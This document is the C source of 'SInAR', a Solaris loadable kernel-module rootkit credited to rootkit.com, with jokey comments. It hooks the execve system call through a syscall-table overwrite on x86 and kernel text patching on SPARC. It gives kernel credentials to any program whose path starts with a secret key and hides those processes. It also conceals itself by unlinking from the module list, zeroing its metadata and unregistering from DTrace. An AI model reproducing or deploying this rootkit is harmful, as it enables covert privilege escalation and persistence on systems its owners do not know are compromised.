/*
 * Copyright (c) 2004 by Archim
 * All rights reserved.
 * 
 * For License information please see LICENSE (that was unexpected wasn't it!).
 * 
 * The header data used is (c) SUN Microsystems, 
 * opcodes.h being the exception I'm the only one boring enough to write that.
 *
 * Wow, a configuration statement, thanks SUN!!
 * bash-3.00$ gcc -v
 * Reading specs from /usr/sfw/lib/gcc/i386-pc-solaris2.10/3.4.3/specs
 * Configured with: /builds/sfw10-gate/usr/src/cmd/gcc/gcc-3.4.3/configure --prefix=/usr/sfw \
 * --with-as=/usr/sfw/bin/gas --with-gnu-as --with-ld=/usr/ccs/bin/ld --without-gnu-ld \
 * --enable-languages=c,c++ --enable-shared
 * Thread model: posix
 * gcc version 3.4.3 (csl-sol210-3_4-branch+sol_rpath)
 */

#include <sys/ddi.h>
#include <sys/sunddi.h>
#include <sys/modctl.h>
#ifdef __i386
#define _SYSCALL32_IMPL // because we are boring
#endif
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/exec.h>
#include <sys/pathname.h>
#include <sys/uio.h>
#include <sys/thread.h>
#include <sys/user.h>
#include <sys/proc.h>
#include <sys/thread.h>
#include <sys/cred.h>
#include <sys/mdb_modapi.h>
#include <sys/kobj.h>
#include <sys/cmn_err.h>
#include <sys/mman.h>


// the following we need for our gubbins later on.
/*<SUN Copyright>*/
typedef struct dtrace_provider dtrace_provider_t;
typedef uintptr_t       dtrace_provider_id_t;

typedef uintptr_t dtrace_icookie_t;
extern dtrace_icookie_t dtrace_interrupt_disable(void);
extern void dtrace_interrupt_enable(dtrace_icookie_t);
/*</SUN Copyright>*/

#ifndef __i386 // woohoo!
#include "opcodes.h"
#define DREG 18;
#endif

extern struct mod_ops mod_miscops;


static struct modlmisc modlmisc = {
        &mod_miscops,
        "SInAR - rootkit.com",
};

static struct modlinkage modlinkage = {
        MODREV_1,  
        (void *)&modlmisc,
        NULL
};


//stubs
int64_t sinar_execve(char *fname, const char **argp, const char **envp);

#ifndef __i386// if SPARC

int  sin_patch(caddr_t kern_call,caddr_t sin_call)
/* 
The moral of the sin_patch story is that you should always print off and highlight header files.
forget using vi, destroy a habitat and read the headers over your beverage of choice.

If you do this you may find that, having written a piece of code you weren't going to release, 
the vendor has already done it for you. Thus easing the decision making process for code release.

Thanks SUN!
*/
{
  caddr_t target;
  uint32_t * opcode;
  unsigned int ddi_crit_lock;
  unsigned long jdest = sin_call;
  unsigned int tmp_imm2 = 0;
  	target = kern_call;

/* 
opcode formation courtesy of the SPARV V9 architecture manual. BUY IT!! 
(or download it you tight fisted git).
*/
	sethop.op = 0;
   	sethop.regd = DREG;
   	sethop.op2 = 4;
   	sethop.imm = (jdest>>10);
   	orop.op = 2;
   	orop.regd = DREG;
   	orop.op3 = 2;
   	orop.rs1 = DREG;
   	orop.i_fl = 1;
   	tmp_imm2 = jdest & 0x3ff;// see "or" in sparc v9 architecture manual.
   	orop.imm = tmp_imm2;
   	jop.start = 2; 
   	jop.regdest = 0; // jmp %reg == jmpl addr,%g0 
   	jop.op3 = 32 + 16 + 8; // signature for jmpl
   	jop.rs1 = DREG; // I wonder what this is!
   	jop.i_fl = 1; // to use simm13
   	jop.simm13 = 0; // offset of 0;
   	nop.nopc = 0x01000000; // this structure is useless, but it's parents love it I suppose.
   	ddi_crit_lock = ddi_enter_critical(); // *ahem* otherwise you could laugh alot.
   	opcode = (uint32_t *)&sethop;
   	hot_patch_kernel_text(target,*opcode,4); // you have to love undocumented functions. Especially this one.
// yes I know it's sloppy but hell, I never said I could code.
//target+=4;
	target = target + 4;
   	opcode = (uint32_t *)&orop;
   	hot_patch_kernel_text(target,*opcode,4);
   	target = target + 4;
   	opcode = (uint32_t *)&jop;
   	hot_patch_kernel_text(target,*opcode,4);
   	target = target + 4;  
   	opcode = (uint32_t *)&nop;
   	hot_patch_kernel_text(target,*opcode,4);
   	ddi_exit_critical(ddi_crit_lock);// because not doing so would be funnier.
 return 0;
}
#endif // SPARC


/*
Change the key as appropriate. 
*/

#define RK_EXEC_KEY "./sinarrk"
#define RK_EXEC_KEY_LEN 9

int64_t sinar_execve(char *fname, const char **argp, const char **envp)
{
 
  int is_gone = 0;
  int error;

pathname_t sinar_pn;


pn_get((char *)fname, UIO_USERSPACE, &sinar_pn);

if(strncmp(RK_EXEC_KEY,sinar_pn.pn_path,RK_EXEC_KEY_LEN) == 0)
  {
	is_gone = 1;
// give ourselves kernel creds. "yeah man he got kcred" *ahem*
	curproc->p_cred = crdup(kcred);

  }
        error = exec_common(fname, argp, envp);  

if(is_gone)
          {
/* 
this hides our process (well, sets us as not worthy of attention..)
Do you think this will make the parent listen to it's child in future?
*/
	curproc->p_pidp->pid_prinactive = 1;
	is_gone = 0;
          }

if(curproc->p_parent)
{
	if(curproc->p_parent->p_pidp->pid_prinactive)
	{
		curproc->p_pidp->pid_prinactive = 1;
	}

}

/*
// "Danger WIll Robinson, Danger Will Robinson"
if(curproc->p_prev)
     curproc->p_prev->p_next = curproc->p_next;

if(curproc->p_next)
     curproc->p_next->p_prev = curproc->p_prev;
// go on, uncomment this block. You understand these things. What could go wrong?
*/

if(error)
{
	return set_errno(error);
}
	else
{
	return 0;
}

}



int _init(void)
{

extern void dtrace_sync(void);
struct modctl *modptr,*modme;
modptr = &modules; // head of the family always get's pointed at, it's a real burden I imagine.
dtrace_icookie_t modcookie;
int * lmid_ptr;
char is10 = 0;
dtrace_provider_id_t * fbtptr = 0;
int (*dt_cond)(dtrace_provider_id_t) = 0; // we'll be wanting this later to remove the DTrace bits.
int i = 0;

        if ((i = mod_install(&modlinkage)) != 0)
	  {
	          cmn_err(CE_NOTE,"Could not install SInAR.\n");
	  }        
	else
	  {
	    cmn_err(CE_NOTE,"SInAR installed.");
	  }

	// now we blank out modlinkage because otherwise it's a wh0re and can be used against us!
       	bzero(&modlinkage,sizeof(struct modlinkage));
	//same goes for modlmisc
	bzero(&modlmisc,sizeof(struct modlmisc));

	lmid_ptr = kobj_getsymvalue("last_module_id",0); // duh!

	modme = modptr->mod_prev;

// now you see me.

	modptr->mod_prev->mod_prev->mod_next = modptr;
	modptr->mod_prev = modptr->mod_prev->mod_prev;

	*lmid_ptr = *lmid_ptr - 1;

        dt_cond = kobj_getsymvalue("dtrace_condense",0);
        if(dt_cond) // if we are solaris 10, or a freaky solaris 9 with DTrace.
          {
                fbtptr = modgetsymvalue("fbt_id", 0);
// if we aren't a solaris 10 box, or don't have DTrace there is no point looking for fbt_id, it's not there.
          if(!fbtptr)
            {
                 cmn_err(CE_NOTE,"Fbt provider not available,\
                 check module fbt is loaded.[try dtrace -l to prompt loading if all else fails].");
                return -1;
            }is10 = 1;}
// remove "non active" modules from FBT (which holds module syms).
        if(is10)
                modcookie = dtrace_interrupt_disable(); // well if it isn't Solaris 10 there is little point using it!


	modme->mod_nenabled = 0; // we ofcourse don't want to be active .. we don't exist after all.
	modme->mod_loaded = 0; // no we aren't loaded, definatly not... honest.
	modme->mod_installed = 0; //  I'm an inactive, unloaded and uninstalled module guv'nor.
	modme->mod_loadcnt = 0;
	modme->mod_gencount = 0;


#ifndef __i386
	sin_patch((caddr_t)sysent[SYS_execve].sy_callc,(caddr_t)&sinar_execve); 
#else
	sysent[SYS_execve].sy_callc = &sinar_execve;
/*
oh <deity of choice>,
 how very depressing a syscall overwrite. I swear these went out of fashion years ago.
*/
#endif
	kobj_sync(); 
// remove symbols from the kernel by re-reading `modules list for active modules, obviously (yes that is a '`')

	if(is10)
   	{
  		cmn_err(CE_NOTE,"SInAR Unregistering from DTrace FBT provider\n"); 
		// what, another log message? really? wow!
  		dt_cond(*fbtptr);
  		dtrace_sync(); // just for our own good
  		//now you don't
  		dtrace_interrupt_enable(modcookie);
  	 }

 return 0;
}


int _info(struct modinfo *modinfop)
{
        return (mod_info(&modlinkage, modinfop));
}

int _fini(void)
{
        int i;
	        
i = mod_remove(&modlinkage);	  
        return i;
}
